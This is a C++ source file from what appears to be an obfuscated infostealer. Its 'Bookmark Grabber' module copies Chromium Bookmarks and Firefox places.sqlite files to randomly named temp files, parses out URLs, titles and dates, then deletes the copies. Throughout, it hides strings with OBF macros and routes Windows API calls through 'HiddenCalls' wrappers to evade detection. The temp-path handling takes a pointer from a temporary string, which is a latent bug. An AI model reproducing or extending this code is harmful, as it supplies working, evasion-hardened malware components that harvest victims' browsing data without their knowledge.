#include "Bookmarks.h"
#include "Browsers_EntryPoint.h"
#include "winapi_structs.h"
#include <iostream>
#include <vector>
#include "json.h"
#include "sqlite3.h"
#include "obfusheader.h"
#include "Helper.h"

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Shell32.lib")

std::vector<Bookmark> Browser::ExtractChromiumBookmarks() {
    DEBUG_PRINT(L"Chromium Boomarks Called");
    std::vector<Bookmark> bookmarks;

    for (const auto& Chromium : chromiumBrowsers) {
        fs::path bookmark = fs::path(Chromium.profileLocation) / OBF("Bookmarks");

        if (!fs::exists(bookmark)) {
            continue;
        }

        const char* bookmarkPath = (TEMP + OBF("\\") + RandomString(7) + OBF(".db")).c_str(); // Idk why you didnt create an temp db for it in the org code, but i js added it here

        try {
            copy_file(bookmark, bookmarkPath, fs::copy_options::overwrite_existing);
        }
        catch (fs::filesystem_error& e) {
            continue;
        }

        HANDLE hFile = HiddenCalls::CreateFileA(
            bookmarkPath, GENERIC_READ, FILE_SHARE_READ, nullptr,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            continue;
        }

        DWORD fileSize = HiddenCalls::GetFileSize(hFile, nullptr);
        if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        HANDLE hMap = HiddenCalls::CreateFileMappingA(hFile, nullptr, PAGE_READONLY, 0, fileSize, nullptr);
        if (!hMap) {
            std::cerr << OBF("Error: Failed to create file mapping for: ") << bookmarkPath << std::endl;
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        LPVOID mappedFile = HiddenCalls::MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, fileSize);
        if (!mappedFile) {
            std::cerr << OBF("Error: Failed to map file for: ") << bookmarkPath << std::endl;
            HiddenCalls::CloseHandle(hMap);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        nlohmann::json bookmarksJson;
        try {
            bookmarksJson = nlohmann::json::parse(static_cast<char*>(mappedFile), static_cast<char*>(mappedFile) + fileSize);
        }
        catch (const std::exception& e) {
            std::cerr << OBF("JSON parsing error in file ") << bookmarkPath << OBF(": ") << e.what() << std::endl;
            HiddenCalls::UnmapViewOfFile(mappedFile);
            HiddenCalls::CloseHandle(hMap);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        HiddenCalls::UnmapViewOfFile(mappedFile);
        HiddenCalls::CloseHandle(hMap);
        HiddenCalls::CloseHandle(hFile);

        auto parseBookmarks = [&](const nlohmann::json& node, auto& parseRef) -> void {
            if (!node.is_object() || !node.contains("children")) return;

            for (const auto& child : node["children"]) {
                if (child.contains("name") && child.contains("url")) {
                    bookmarks.push_back({
                        child["url"].get<std::string>(),
                        child["name"].get<std::string>(),
                        child.value("date_added", OBF("0"))
                        });
                }
                parseRef(child, parseRef);
            }
            };

        if (bookmarksJson.contains("roots")) {
            for (const auto& item : bookmarksJson["roots"].items()) {
                parseBookmarks(item.value(), parseBookmarks);
            }
        }

        try {
            fs::remove(bookmarkPath);
        }
        catch (...) {}
    }

    for (const auto& Gecko : geckoBrowsers) {
        fs::path bookmark = fs::path(Gecko.profileLocation) / OBF("places.sqlite");

        if (!fs::exists(bookmark)) {
            continue;
        }

        const char* bookmarkPath = (TEMP + OBF("\\") + RandomString(7) + OBF(".db")).c_str();

        sqlite3* db = nullptr;
        sqlite3_stmt* stmt = nullptr;

        try {
            copy_file(bookmark, bookmarkPath, fs::copy_options::overwrite_existing);
        }
        catch (fs::filesystem_error& e) {
            continue;
        }

        if (sqlite3_open(bookmarkPath, &db) != SQLITE_OK || db == nullptr) {
            std::cerr << OBF("Error: Cannot open SQLite database: ") << bookmarkPath << std::endl;
            return bookmarks;
        }

        const char* query = OBF("SELECT id, url, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)");

        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK || stmt == nullptr) {
            sqlite3_close(db);
            return bookmarks;
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Bookmark bk;
            bk.name = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3)));
            bk.url = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
            bk.date_added = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2)));
            bookmarks.push_back(bk);
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);

        try {
            fs::remove(bookmarkPath);
        }
        catch (...) {}
    }

    DEBUG_PRINT(L"Chromium Bookmark Grabber Passed");

    return bookmarks;
}
